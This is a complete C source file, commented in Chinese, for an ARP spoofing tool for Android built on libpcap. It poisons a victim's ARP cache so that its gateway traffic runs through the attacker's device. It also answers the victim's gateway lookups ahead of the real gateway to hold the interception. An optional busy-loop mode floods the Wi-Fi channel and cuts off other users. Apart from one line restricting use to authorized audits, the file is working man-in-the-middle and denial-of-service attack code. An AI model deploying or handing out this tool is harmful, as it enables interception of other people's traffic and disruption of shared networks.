/*
 * 极简 ARP 欺骗工具（libpcap 实现，静态编译内置到装维工具箱）。
 * 用途：流量审计的 ARP 中间人——持续向 victim 发送伪造 ARP 应答，
 * 宣称"spoof_ip 的 MAC 是本机"，把 victim 发往 spoof_ip 的流量引到本机。
 *
 * 用法: arpspoof <iface> <victim_ip> <spoof_as_ip> [spoof_mac]
 *   例: arpspoof wlan0 192.168.1.100 192.168.1.1
 * 需 root（AF_PACKET 发包）。仅限已获授权的装维/审计场景使用。
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <pcap.h>
#include <sys/time.h>

/* Android bionic 精简 if_ether.h，这里自定 ARP 常量与结构 */
#define ARPHRD_ETHER 1
#define ETHERTYPE_IP 0x0800
#define ARPOP_REQUEST 1
#define ARPOP_REPLY 2

/* 以太网头：dst(6) + src(6) + type(2)，1 字节对齐（否则编译器填充导致帧错位） */
struct __attribute__((packed)) eth_hdr {
    unsigned char dst[6];
    unsigned char src[6];
    unsigned short type;
};

/* ARP 报文（固定 28 字节，无 padding）——必须 packed，否则 uint32_t 字段会被 4 字节对齐填充，spa/tpa 偏移错位 */
struct __attribute__((packed)) arp_pkt_hdr {
    unsigned short htype;
    unsigned short ptype;
    unsigned char hlen;
    unsigned char plen;
    unsigned short op;
    unsigned char sha[6];
    uint32_t spa;
    unsigned char tha[6];
    uint32_t tpa;
};

/* 解析 MAC（"aa:bb:cc:dd:ee:ff"） */
static int parse_mac(const char *s, unsigned char *out) {
    unsigned int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6)
        return -1;
    for (int i = 0; i < 6; i++) out[i] = (unsigned char)v[i];
    return 0;
}

/* 获取本机接口 MAC */
static int get_iface_mac(const char *ifname, unsigned char *mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    int r = ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    if (r < 0) return -1;
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    return 0;
}

/* 获取本机接口 IP（ARP 请求的 sender 用） */
static int get_iface_ip(const char *ifname, uint32_t *ip) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    int r = ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    if (r < 0) return -1;
    struct sockaddr_in *sin = (struct sockaddr_in *)&ifr.ifr_addr;
    *ip = sin->sin_addr.s_addr;
    return 0;
}

/* 从 /proc/net/arp 解析 victim 的 MAC（放宽：只要该 IP 行有合法非零 MAC 即可——0x0
 * 未确认条目也带历史 MAC，目标 MAC 未变时欺骗照发；INCOMPLETE 全零 MAC 则拒绝） */
static int get_victim_mac(const char *victim_ip, unsigned char *mac) {
    FILE *f = fopen("/proc/net/arp", "r");
    if (!f) return -1;
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        char ip[64] = {0}, hw[64] = {0};
        int type = 0, flags = 0;
        if (sscanf(line, "%63s 0x%x 0x%x %63s", ip, &type, &flags, hw) == 4) {
            if (strcmp(ip, victim_ip) == 0 && parse_mac(hw, mac) == 0) {
                int zero = 1;
                for (int i = 0; i < 6; i++) if (mac[i]) { zero = 0; break; }
                if (!zero) {
                    fclose(f);
                    return 0;
                }
            }
        }
    }
    fclose(f);
    return -1;
}

/* 发一个 ARP 包（42 字节 = 14 以太 + 28 ARP） */
static int send_arp(pcap_t *p, const unsigned char *src_mac, const unsigned char *dst_mac,
                    uint32_t spa, uint32_t tpa, int op) {
    unsigned char pkt[42];
    memset(pkt, 0, sizeof(pkt));
    struct eth_hdr *eth = (struct eth_hdr *)pkt;
    struct arp_pkt_hdr *arp = (struct arp_pkt_hdr *)(pkt + 14);
    memcpy(eth->dst, dst_mac, 6);
    memcpy(eth->src, src_mac, 6);
    /* 以太类型必须是 ARP（0x0806），写 0x0800(IP) 会被接收方当 IP 帧丢弃，ARP 通告无效 */
    eth->type = htons(0x0806);
    arp->htype = htons(ARPHRD_ETHER);
    arp->ptype = htons(ETHERTYPE_IP);
    arp->hlen = 6;
    arp->plen = 4;
    arp->op = htons((unsigned short)op);
    memcpy(arp->sha, src_mac, 6);
    memcpy(&arp->spa, &spa, 4);
    memcpy(arp->tha, dst_mac, 6);
    memcpy(&arp->tpa, &tpa, 4);
    return pcap_sendpacket(p, pkt, sizeof(pkt));
}

/* 发 ARP 请求并抓 victim 的 reply，提取 victim MAC。
 * 用 libpcap 抓包解析（Android per-network netns 下 /proc/net/arp 读不到 wlan0 真实 ARP 表） */
static int resolve_victim_mac(pcap_t *p, const unsigned char *my_mac, uint32_t my_ip,
                              uint32_t victim, unsigned char *mac) {
    unsigned char bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    for (int attempt = 0; attempt < 4; attempt++) {
        send_arp(p, my_mac, bcast, my_ip, victim, ARPOP_REQUEST);
        for (int i = 0; i < 30; i++) { /* 每轮 ~50ms，共 1.5s */
            struct pcap_pkthdr *hdr;
            const unsigned char *pkt;
            int r = pcap_next_ex(p, &hdr, &pkt);
            if (r == 1 && hdr->caplen >= 42) {
                /* 以太类型 0x0806(ARP) 且 op==2(REPLY) 且 spa==victim → sha 即 victim MAC */
                if (pkt[12] == 0x08 && pkt[13] == 0x06) {
                    unsigned int op = ((unsigned int)pkt[20] << 8) | pkt[21];
                    uint32_t spa = ((uint32_t)pkt[28] << 24) | ((uint32_t)pkt[29] << 16) |
                                   ((uint32_t)pkt[30] << 8) | pkt[31];
                    if (op == ARPOP_REPLY && spa == victim) {
                        memcpy(mac, pkt + 22, 6);
                        return 0;
                    }
                }
            } else if (r < 0) {
                return -1;
            }
            usleep(50000);
        }
    }
    return -1;
}

int main(int argc, char **argv) {
    if (argc < 4) {
        fprintf(stderr, "usage: %s <iface> <victim_ip> <spoof_as_ip> [spoof_mac]\n", argv[0]);
        return 1;
    }
    const char *ifname = argv[1];
    uint32_t victim = inet_addr(argv[2]);
    uint32_t spoof = inet_addr(argv[3]);
    if (victim == INADDR_NONE || spoof == INADDR_NONE) {
        fprintf(stderr, "bad ip\n");
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *p = pcap_open_live(ifname, 65535, 0, 100, errbuf);
    if (!p) {
        fprintf(stderr, "pcap_open_live: %s\n", errbuf);
        return 1;
    }

    unsigned char my_mac[6];
    if (get_iface_mac(ifname, my_mac) < 0) {
        fprintf(stderr, "cannot get iface mac\n");
        return 1;
    }
    /* 可指定伪造 MAC（"-"或省略=默认本机 MAC） */
    unsigned char spoof_mac[6];
    memcpy(spoof_mac, my_mac, 6);
    if (argc >= 5 && argv[4][0] != '-' && parse_mac(argv[4], spoof_mac) < 0) {
        fprintf(stderr, "bad mac\n");
        return 1;
    }
    /* 主动发包间隔（毫秒）：500 标准 / 30 洪泛 / 0 忙循环信道阻塞 */
    int interval_ms = 500;
    if (argc >= 6) interval_ms = atoi(argv[5]);
    /* 定向欺骗：解析 victim 的 MAC 后只发给它（广播会污染全网及自身的 ARP 缓存，造成集体断网） */
    unsigned char victim_mac[6];
    if (get_victim_mac(argv[2], victim_mac) < 0) {
        /* ARP 表读不到（Android per-netns）→ 发 ARP 请求并抓 reply 解析 */
        uint32_t my_ip = 0;
        get_iface_ip(ifname, &my_ip);
        if (resolve_victim_mac(p, my_mac, my_ip, victim, victim_mac) < 0) {
            fprintf(stderr, "cannot resolve victim mac (device offline or ARP hidden)\n");
            return 1;
        }
    }

    fprintf(stderr, "arp spoofing: %s -> %s as %s (iface %s, victim %02x:%02x:%02x:%02x:%02x:%02x)\n",
            argv[2], inet_ntoa(*(struct in_addr *)&spoof), inet_ntoa(*(struct in_addr *)&victim), ifname,
            victim_mac[0], victim_mac[1], victim_mac[2], victim_mac[3], victim_mac[4], victim_mac[5]);

    /* 持续欺骗：被动抢先应答 + 周期主动诱导（稳定静默的关键）。
     * 双模式：①免费应答（Reply）——接受 gratuitous ARP 的设备直接生效；
     * ②诱导请求（Request）——伪装 spoof（网关）发 who-has victim，victim 处理 ARP 请求时
     *   会更新 sender(网关) 的 IP-MAC 映射为手机，对 arp_accept=0（忽略免费应答）的
     *   Android/Linux 内核设备同样生效；
     * ③**抢先应答**——被动监听 victim 重新解析网关的请求（who-has spoof tell victim），
     *   立即抢在真网关前回复"网关=手机"：自己发起的请求的应答必然被接受，
     *   否则 victim 断网后会重新解析并收敛到真网关（表现=转几秒圈又恢复）。
     * interval_ms：主动发包周期；0=忙循环信道阻塞（不睡眠无限发包，占满空口杀长连接，
     * 副作用是同 Wi-Fi 其他设备一起卡，仅限授权测试场景）。 */
    pcap_setnonblock(p, 1, errbuf);
    struct timeval last = {0};
    while (1) {
        struct pcap_pkthdr *hdr;
        const unsigned char *pkt;
        int r = pcap_next_ex(p, &hdr, &pkt);
        if (r == 1 && hdr->caplen >= 42 && pkt[12] == 0x08 && pkt[13] == 0x06) {
            unsigned int op = ((unsigned int)pkt[20] << 8) | pkt[21];
            uint32_t spa = ((uint32_t)pkt[28] << 24) | ((uint32_t)pkt[29] << 16) |
                           ((uint32_t)pkt[30] << 8) | pkt[31];
            uint32_t tpa = ((uint32_t)pkt[38] << 24) | ((uint32_t)pkt[39] << 16) |
                           ((uint32_t)pkt[40] << 8) | pkt[41];
            /* victim 在重新解析网关 → 抢先应答"网关=手机" */
            if (op == ARPOP_REQUEST && spa == victim && tpa == spoof) {
                send_arp(p, spoof_mac, victim_mac, spoof, victim, ARPOP_REPLY);
            }
        }
        if (interval_ms <= 0) {
            /* 忙循环信道阻塞：每轮都发（不睡眠），占满空口压制真网关与 victim 长连接 */
            send_arp(p, spoof_mac, victim_mac, spoof, victim, ARPOP_REPLY);
            send_arp(p, spoof_mac, victim_mac, spoof, victim, ARPOP_REQUEST);
        } else {
            struct timeval now;
            gettimeofday(&now, NULL);
            long elapsedMs = (now.tv_sec - last.tv_sec) * 1000 + (now.tv_usec - last.tv_usec) / 1000;
            if (elapsedMs >= interval_ms) {
                send_arp(p, spoof_mac, victim_mac, spoof, victim, ARPOP_REPLY);
                send_arp(p, spoof_mac, victim_mac, spoof, victim, ARPOP_REQUEST);
                last = now;
            }
            usleep(5000); /* 5ms 轮询：兼顾抢答 + 洪泛密度 */
        }
    }
    return 0;
}
